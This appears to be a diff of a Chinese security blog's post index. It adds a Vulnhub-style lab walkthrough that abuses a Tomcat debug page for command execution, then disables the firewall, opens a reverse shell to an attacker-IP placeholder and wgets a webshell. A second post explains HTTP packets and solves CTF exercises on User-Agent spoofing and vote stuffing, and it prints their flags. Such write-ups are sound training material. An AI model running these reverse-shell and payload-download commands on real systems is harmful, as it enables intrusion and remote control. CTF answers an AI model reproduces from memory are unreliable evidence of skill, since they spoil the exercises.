-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888929543-acec2a55-46c0-42b9-bef4-49a8f82da9b0.png" alt="img"></p>
-<h2 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h2><p>&emsp;&emsp;关闭防火墙，没有消息就是好消息，关闭防火墙成功</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo ufw <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890317314-9933a34f-e2ad-4fdf-9a6f-95632003b44d.png" alt="img"></p>
-<p>&emsp;&emsp;kali打开nc监听某个端口，这里我设置为4444</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638889015592-7186314f-5027-4ef9-a7df-20a3cf07290f.png" alt="img"></p>
-<p>&emsp;&emsp;反弹shell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890413880-fad8ef90-a6dd-4925-92ba-b0275464e792.png" alt="img"></p>
-<p><strong>【插播：渗透测试技巧】</strong></p>
-<p>&emsp;&emsp;开启python简易http服务器</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;利用命令执行下载木马文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo wget “http://ip:port/shell.jsp” -O /var /lib/tomcat8/webapps/ROOT/shell.jsp</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;拿到flag</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890458865-543de0aa-dfe5-4431-b232-17b986961b35.png" alt="img"></p>
-<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>&emsp;&emsp;在CTF比赛中，命令执行漏洞具有很多过滤机制。对于开放ssh服务的靶场机器，可以采取以上方法进行渗透靶场机器。如果没有开放ssh服务，则需要利用绕过过滤技巧来达到命令执行的目的。</p>
-]]></content>
-      <categories>
-        <category>综合靶场</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>提权</tag>
-        <tag>SSH</tag>
-        <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Vulnhub——ZICO2:1</title>
     <url>/post/da4faa60.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶机说明"><a href="#一、靶机说明" class="headerlink" title="一、靶机说明"></a>一、靶机说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;靶场镜像：链接: <a href="https://www.vulnhub.com/entry/zico2-1,210/">https://www.vulnhub.com/entry/zico2-1,210/</a></p>
@@ -1173,6 +1074,243 @@
       <tags>
         <tag>CTF</tag>
         <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web命令执行+SSH</title>
+    <url>/post/bb5c1570.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶机说明"><a href="#一、靶机说明" class="headerlink" title="一、靶机说明"></a>一、靶机说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;靶场镜像：链接: <a href="https://pan.baidu.com/s/19k8jz7VARhFW3LYw8U6T9w">https://pan.baidu.com/s/19k8jz7VARhFW3LYw8U6T9w</a> 提取码: 97qz</p>
+<h2 id="2、靶机准备"><a href="#2、靶机准备" class="headerlink" title="2、靶机准备"></a>2、靶机准备</h2><h3 id="（1）重置靶场密码"><a href="#（1）重置靶场密码" class="headerlink" title="（1）重置靶场密码"></a>（1）重置靶场密码</h3><p>&emsp;&emsp;重启主机，长按shift，进入如下界面后，按e</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638887523058-deb5b563-6577-4a58-9b10-b61cf1a64131.png" alt="img"></p>
+<p>&emsp;&emsp;找到linux开头的行，在最后输入 <code>init=/bin/bash</code>，输入完成后按<strong>Crtl+X</strong></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638887553506-8fa2221e-2e9e-401e-84d4-facedf386f49.png" alt="img"></p>
+<p>&emsp;&emsp;<code>mount -o rw,remount /</code>，回车</p>
+<p>&emsp;&emsp;<code>    passwd root</code>，输入新密码两次</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638887624157-f28ec6e4-9aae-42bd-bd62-54c7c5cad409.png" alt="img"></p>
+<p>&emsp;&emsp;如果提示改变密码成功，重启该虚拟机</p>
+<h3 id="（2）查看IP"><a href="#（2）查看IP" class="headerlink" title="（2）查看IP"></a>（2）查看IP</h3><p>&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入<code>ip a</code>，查看IP地址</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638887754060-4b761873-9c17-4aff-9947-9e1b7da5b83b.png" alt="img"></p>
+<h1 id="二、预备知识"><a href="#二、预备知识" class="headerlink" title="二、预备知识"></a>二、预备知识</h1><p>&emsp;&emsp;使用 <code>ssh 用户名@localhost</code> 通过ssh登录服务器是不需要身份验证的</p>
+<h1 id="三、信息收集"><a href="#三、信息收集" class="headerlink" title="三、信息收集"></a>三、信息收集</h1><h2 id="1、探测主机IP"><a href="#1、探测主机IP" class="headerlink" title="1、探测主机IP"></a>1、探测主机IP</h2><p>&emsp;&emsp;可以使用以下两种方法：arp-scan和netdiscover</p>
+<h3 id="（1）arp-scan"><a href="#（1）arp-scan" class="headerlink" title="（1）arp-scan"></a>（1）arp-scan</h3><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.107</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888028567-436c33ce-2113-4b29-82d7-6509f75c0381.png" alt="img"></p>
+<h3 id="（2）netdiscover"><a href="#（2）netdiscover" class="headerlink" title="（2）netdiscover"></a>（2）netdiscover</h3><p>&emsp;&emsp;使用以下命令查看Kali本机IP为192.168.1.108</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888053910-d470e9e5-c769-4c94-88e9-d57151d282b5.png" alt="img"></p>
+<p>&emsp;&emsp;使用netdiscover命令 <code>netdiscover -r ip/子网掩码</code> 命令来探测靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888190817-8138f7e8-dd3d-4641-9a4c-993c7df0276d.png" alt="img"></p>
+<h2 id="2、开放端口与服务扫描"><a href="#2、开放端口与服务扫描" class="headerlink" title="2、开放端口与服务扫描"></a>2、开放端口与服务扫描</h2><p>&emsp;&emsp;使用nmap对IP进行扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.107</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;可以看到开放了8080端口，为HTTP服务</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888418264-d4bb0e6e-05d5-4e4f-b80b-9afeeb715300.png" alt="img"></p>
+<p>&emsp;&emsp;访问8080端口，发现是Tomcat建立成功的初始页面</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888484073-cc45897a-36d0-4151-859a-4f3756a7b543.png" alt="img"></p>
+<h2 id="3、目录扫描"><a href="#3、目录扫描" class="headerlink" title="3、目录扫描"></a>3、目录扫描</h2><p>&emsp;&emsp;可以使用dirsearch扫描或者nikto探测</p>
+<h3 id="（1）dirsearch"><a href="#（1）dirsearch" class="headerlink" title="（1）dirsearch"></a>（1）dirsearch</h3><p>&emsp;&emsp;目录扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.1.107:8080</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;扫出了个<code>/test.jsp</code></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627714481394-793cd585-281c-4c0c-a0dd-100686418c23.png" alt="img"></p>
+<h3 id="（2）nikto"><a href="#（2）nikto" class="headerlink" title="（2）nikto"></a>（2）nikto</h3><p>&emsp;&emsp;使用nikto探测，发现test.jsp可能比较因缺思厅，那么就让我康康！</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888727790-756708be-5ddd-416a-a8d4-ab60f463f87e.png" alt="img"></p>
+<h1 id="四、漏洞探测与利用"><a href="#四、漏洞探测与利用" class="headerlink" title="四、漏洞探测与利用"></a>四、漏洞探测与利用</h1><h2 id="1、漏洞探测——命令执行"><a href="#1、漏洞探测——命令执行" class="headerlink" title="1、漏洞探测——命令执行"></a>1、漏洞探测——命令执行</h2><p>&emsp;&emsp;访问：<code>http://192.168.1.107:8080/test.jsp</code>，出现以下页面，这是一个调试页面，可以用来命令执行</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888844966-6ad86d97-315e-493b-a328-a179d0dc9bf1.png" alt="img"></p>
+<h2 id="2、信息收集"><a href="#2、信息收集" class="headerlink" title="2、信息收集"></a>2、信息收集</h2><p>&emsp;&emsp;查看临时缓冲目录，没什么有用的信息</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -alh /tmp/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890755332-793e01fb-8db4-45e0-9407-5a6a313b1d98.png" alt="img"></p>
+<p>&emsp;&emsp;查看home目录，挖掘用户信息，发现了bill</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -la /home</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888879666-caeef8fc-7376-4eeb-b998-f2dff92a7e57.png" alt="img"></p>
+<p>&emsp;&emsp;查看具体用户bill的目录，我们可以看到具有ssh服务，后续可以使用sudo来拿到root</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /home/bill -lah</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890826401-c5969405-0a1d-4bf2-9786-41da55dd1b9a.png" alt="img"></p>
+<p>&emsp;&emsp;查看系统信息，为ubuntu系统</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638891176526-0aa76660-1b06-4f13-b9b7-0255c9e0477f.png" alt="img"></p>
+<p>&emsp;&emsp;查看用户bill在主机上可以使用和禁止的命令，没什么有用的信息</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888929543-acec2a55-46c0-42b9-bef4-49a8f82da9b0.png" alt="img"></p>
+<h2 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h2><p>&emsp;&emsp;关闭防火墙，没有消息就是好消息，关闭防火墙成功</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo ufw <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890317314-9933a34f-e2ad-4fdf-9a6f-95632003b44d.png" alt="img"></p>
+<p>&emsp;&emsp;kali打开nc监听某个端口，这里我设置为4444</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638889015592-7186314f-5027-4ef9-a7df-20a3cf07290f.png" alt="img"></p>
+<p>&emsp;&emsp;反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890413880-fad8ef90-a6dd-4925-92ba-b0275464e792.png" alt="img"></p>
+<p><strong>【插播：渗透测试技巧】</strong></p>
+<p>&emsp;&emsp;开启python简易http服务器</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;利用命令执行下载木马文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo wget “http://ip:port/shell.jsp” -O /var /lib/tomcat8/webapps/ROOT/shell.jsp</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;拿到flag</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890458865-543de0aa-dfe5-4431-b232-17b986961b35.png" alt="img"></p>
+<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>&emsp;&emsp;在CTF比赛中，命令执行漏洞具有很多过滤机制。对于开放ssh服务的靶场机器，可以采取以上方法进行渗透靶场机器。如果没有开放ssh服务，则需要利用绕过过滤技巧来达到命令执行的目的。</p>
+]]></content>
+      <categories>
+        <category>综合靶场</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>提权</tag>
+        <tag>SSH</tag>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web数据包拓展</title>
+    <url>/post/488cc6a6.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、网站解析对应"><a href="#一、网站解析对应" class="headerlink" title="一、网站解析对应"></a>一、网站解析对应</h1><p>&emsp;&emsp;涉及到的攻击层面？（源码，搭建平台，系统，网络层等） </p>
+<p>&emsp;&emsp;涉及到的安全问题？（目录，敏感文件，弱口令，IP 及域名等）  </p>
+<h1 id="二、HTTP-HTTPS数据包"><a href="#二、HTTP-HTTPS数据包" class="headerlink" title="二、HTTP/HTTPS数据包"></a>二、HTTP/HTTPS数据包</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630581800265-8a77b9ec-0619-4cec-914d-705eaad8f74e.png" alt="image.png"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630582307082-e666f24e-a7ac-4d99-b3df-abdaa21068c7.png" alt="image.png"></p>
+<h1 id="三、HTTP-HTTPS具体区别"><a href="#三、HTTP-HTTPS具体区别" class="headerlink" title="三、HTTP/HTTPS具体区别"></a>三、HTTP/HTTPS具体区别</h1><h2 id="3-1-HTTP简要通信过程"><a href="#3-1-HTTP简要通信过程" class="headerlink" title="3.1 HTTP简要通信过程"></a>3.1 HTTP简要通信过程</h2><p>&emsp;&emsp;建立连接–&gt;发送请求数据包–&gt;返回相应数据包–&gt;关闭连接</p>
+<ol>
+<li>浏览器建立与Web服务器之间的连接</li>
+<li>浏览器将请求数据打包（生成请求数据包）并发送到Web服务器</li>
+<li>Web服务器将处理结果打包（生成相应数据包）并发送给浏览器</li>
+<li>Web服务器关闭连接</li>
+</ol>
+<h2 id="3-2-HTTPS简要通信过程（见图）"><a href="#3-2-HTTPS简要通信过程（见图）" class="headerlink" title="3.2 HTTPS简要通信过程（见图）"></a>3.2 HTTPS简要通信过程（见图）</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630582387031-e39f1241-1f9b-4aaf-9c68-e07123f7b7a7.png" alt="image.png"></p>
+<h1 id="四、Request请求数据包数据格式"><a href="#四、Request请求数据包数据格式" class="headerlink" title="四、Request请求数据包数据格式"></a>四、Request请求数据包数据格式</h1><ul>
+<li><p>请求行：请求类型/请求资源路径、版本的协议和类型</p>
+</li>
+<li><p>请求头：一些键值对，浏览器与Web服务器之间都可以发送，特定的某种含义</p>
+</li>
+<li><p>空行：请求头与请求体之间用一个空行隔开</p>
+</li>
+<li><p>请求体：要发送的数据（一般POST提交会使用）；例：user=123&amp;pas=123</p>
+</li>
+</ul>
+<p>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Request Headers</span><br><span class="line">POST /adduser HTTP/1.1</span><br><span class="line">Host: localhost:8030</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Origin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)</span><br><span class="line">Chrome/66.0.3359.181 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"># Form Data</span><br><span class="line">name=name&amp;age=11</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-1-请求行"><a href="#4-1-请求行" class="headerlink" title="4.1 请求行"></a>4.1 请求行</h2><p>&emsp;&emsp;请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分隔</p>
+<p>&emsp;&emsp;例如：GET /index.html HTTP/1.1  </p>
+<p>&emsp;&emsp;HTTP规划定义了8种可能的请求方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET：检索URL中标识资源的一个简单请求</span><br><span class="line">HEAD：与GET方法相同，服务器只返回状态行和头标，并不返回请求文档</span><br><span class="line">POST：服务器接收被写入客户端输出流中的数据的请求</span><br><span class="line">PUT：服务器保存请求数据作为指定URL新内容的请求</span><br><span class="line">DELETE：服务器删除URL中命令的资源的请求</span><br><span class="line">OPTIONS：关于服务器支持的请求方法信息的请求</span><br><span class="line">TRACE：Web服务器反馈HTTP请求和其头标的请求</span><br><span class="line">CONNECT：已文档化，但当前未实现的一个方法，预留做隧道处理</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-2-请求头"><a href="#4-2-请求头" class="headerlink" title="4.2 请求头"></a>4.2 请求头</h2><p>由关键字/值对组成，每行一对，关键字和值用冒号分隔。请求头标通知服务器腾于客户端的功能和标识。</p>
+<ul>
+<li><strong>HOST:</strong> 主机或域名地址 </li>
+<li><strong>Accept：</strong>指浏览器或其他客户可以接受的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格 式。 </li>
+<li><strong>User-Agent：</strong>是客户浏览器名称 </li>
+<li><strong>Host：</strong>对应网址 URL 中的 Web 名称和端口号。 </li>
+<li><strong>Accept-Langeuage：</strong>指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。 </li>
+<li><strong>Connection：</strong>用来告诉服务器是否可以维持固定的 HTTP 连接。<strong>HTTP 是无连接的</strong>，HTTP/1.1 使用 Keep-Alive 为默认值，这样，当浏览器需要多个文件时（比如一个 HTML 文件和相关的图形文件），不需要每次都建立连接 </li>
+<li><strong>Cookie：</strong>浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。 </li>
+<li><strong>X-Forwarded-For：</strong>是用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中</li>
+<li><strong>X-Real-IP：</strong>一般只记录真实发出请求的客户端IP</li>
+<li><strong>Referer：</strong>表明产生请求的网页URL。如比从网页 <a href="/icconcept/index.jsp">/icconcept/index.jsp</a> 中点击一个链接到网页 <a href="/icwork/search">/icwork/search</a> ，在向服务器发送的 GET /icwork/search 中的请求中，Referer是 <a href="http://hostname:8080/icconcept/index.jsp">http://hostname:8080/icconcept/index.jsp</a> ，这个属性可以用来跟踪Web请求是从什么网站来的。（比如一些邀请链接就是通过Referer头来判别走的是谁的邀请，购买了什么商品，对邀请人进行奖励）</li>
+<li><strong>Content-Type：</strong>用来表明 Request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。 </li>
+<li><strong>Accept-Charset：</strong>指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1. </li>
+<li><strong>Accept-Encoding：</strong>指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</li>
+<li><strong>空行：</strong>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。 </li>
+<li><strong>请求数据：</strong>使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。</li>
+</ul>
+<h1 id="五、Respones返回数据包数据格式"><a href="#五、Respones返回数据包数据格式" class="headerlink" title="五、Respones返回数据包数据格式"></a>五、Respones返回数据包数据格式</h1><p>​    一个响应由四个部分组成：状态行、响应头标、空行、响应数据。 </p>
+<ul>
+<li><p><strong>状态行：</strong>协议版本、数字形式的状态代码和状态描述，每个元素之间以空格分隔 </p>
+</li>
+<li><p><strong>响应头标：</strong>包含服务器类型、日期、长度、内容类型等 </p>
+</li>
+<li><p><strong>空行：</strong>响应头与响应体之间用空行隔开 </p>
+</li>
+<li><p><strong>响应数据：</strong>浏览器会将实体内容中的数据取出来，生成相应的页面</p>
+</li>
+</ul>
+<ul>
+<li><p>HTTP 响应码： </p>
+<ul>
+<li><strong>1xx：</strong>信息，请求收到，继续处理 </li>
+<li><strong>2xx：</strong>成功，行为被成功地接受、理解和采纳 </li>
+<li><strong>3xx：</strong>重定向，为了完成请求，必须进一步执行的动作 </li>
+<li><strong>4xx：</strong>客户端错误 </li>
+<li><strong>5xx：</strong>服务器错误</li>
+</ul>
+<p>判断文件（夹）是否存在</p>
+<ul>
+<li><p><strong>200</strong> 存在文件</p>
+</li>
+<li><p><strong>3xx</strong> 均可能存在</p>
+</li>
+<li><p><strong>403</strong> 存在文件夹</p>
+</li>
+</ul>
+<ul>
+<li><strong>404</strong> 不存在文件及文件夹</li>
+<li><strong>500</strong> 均可能存在</li>
+<li>因此在扫描网站后台时最好这三个选项都选上</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630582387031-e39f1241-1f9b-4aaf-9c68-e07123f7b7a7.png" alt="image.png"></p>
+<ul>
+<li><p>响应头标：像请求头标一样，它们指出服务器的功能，标识出响应数据的细节</p>
+</li>
+<li><p>空行：最后一个响应头标之后是一个空行，发送回车符和退行，表明服务器以下不再有头标</p>
+</li>
+<li><p>响应数据：HTML文档和图像等，也就是HTML本身</p>
+</li>
+</ul>
+<h1 id="六、例子"><a href="#六、例子" class="headerlink" title="六、例子"></a>六、例子</h1><h2 id="6-1-第三方检测修改实现XSS攻击"><a href="#6-1-第三方检测修改实现XSS攻击" class="headerlink" title="6.1 第三方检测修改实现XSS攻击"></a>6.1 第三方检测修改实现XSS攻击</h2><p>&emsp;&emsp;之前某长之家的IP查询功能页面，因为会通过数据包获取User-Agent信息并显示在网页上，而没有采取防御措施，因此有XSS漏洞，目前已修复</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211204002740481.png" alt="image.png"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211204002715493.png" alt="image.png"></p>
+<h2 id="6-2-CTF或实际应用中部分考题解析（mozhe）"><a href="#6-2-CTF或实际应用中部分考题解析（mozhe）" class="headerlink" title="6.2 CTF或实际应用中部分考题解析（mozhe）"></a>6.2 CTF或实际应用中部分考题解析（mozhe）</h2><h3 id="6-2-1-浏览器信息伪造"><a href="#6-2-1-浏览器信息伪造" class="headerlink" title="6.2.1 浏览器信息伪造"></a>6.2.1 浏览器信息伪造</h3><p>&emsp;&emsp;背景介绍：小墨了解到从微信6.0开始，其内嵌的浏览器在User Agent字符串中增加了NetType字段用于标识客户端（手机）当前的网络环境，增加之后真的安全吗？  </p>
+<p>&emsp;&emsp;解题方向： 根据页面提示，抓包分析除了判断浏览器类型还判断了微信特有的NetType</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630590160405-96a77c4a-04ad-4e78-acde-7f1480360654.png" alt="image.png"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211204002943832.png" alt="image.png"></p>
+<p>&emsp;&emsp;查阅资料发现符合的User-Agent：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0 NetType/2G</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630589984309-a1cd1d42-e840-44d5-84a2-658bec61ac0a.png" alt="image.png"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630590246964-dec0cada-67e8-458f-ab15-e1d49724dee9.png" alt="image.png"></p>
+<p>&emsp;&emsp;KEY： mozhe1540417e23d339b162b1bbe84c9  </p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630590449601-6395ce00-5d15-426a-b139-f8917fa52c4c.png" alt="image.png"></p>
+<h3 id="6-2-2-投票常见漏洞分析溯源"><a href="#6-2-2-投票常见漏洞分析溯源" class="headerlink" title="6.2.2 投票常见漏洞分析溯源"></a>6.2.2 投票常见漏洞分析溯源</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630590610448-8bf38ef9-d69a-4b0c-998d-378938d39a30.png" alt="image.png"></p>
+<p>&emsp;&emsp;随便投一票，发现说要微信打开</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591209350-92ed9d7b-639f-4af2-9094-7d3466aa7e6d.png" alt="image.png"></p>
+<p>&emsp;&emsp;查阅资料知道微信的User-agent有：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mozilla/5.0 (Linux; U; Android 5.0.2; zh-cn; MI 2C Build/LRX22G) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.4 TBS/025469 Mobile Safari/533.1 MicroMessenger/6.2.5.53_r2565f18.621 NetType/WIFI Language/zh_CN</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;使用微信的User-Agent后，投票成功</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591250818-899f9e23-1511-4cce-8fd7-beeb6c132c3f.png" alt="image.png"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211204003313408.png" alt="image.png"></p>
+<p>&emsp;&emsp;使用Repeater再次进行一遍，无误</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591402410-b006ecb0-f7b6-446c-9c7e-02925c77914d.png" alt="image.png"></p>
+<p>&emsp;&emsp;使用Intruder疯狂投票吧！</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591464881-f13c8d47-dc96-4e02-8da3-b7f6ac4d5ebb.png" alt="image.png"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591492701-8436708a-4bd7-4225-94a5-8a3f1b329b9b.png" alt="image.png"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591511008-c4262ba6-2bbd-4cbb-a82d-5c96faf11b19.png" alt="image.png"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591524853-d073c65c-bd75-45d2-935f-0df67fa822cf.png" alt="image.png"></p>
+<p>&emsp;&emsp;差不多就可以停了，KEY：mozhece264154fdee3bfe3040b0c3ba1</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591573893-8d4ed94e-a54a-4043-91f4-0be0ed4b3f76.png" alt="image.png"></p>
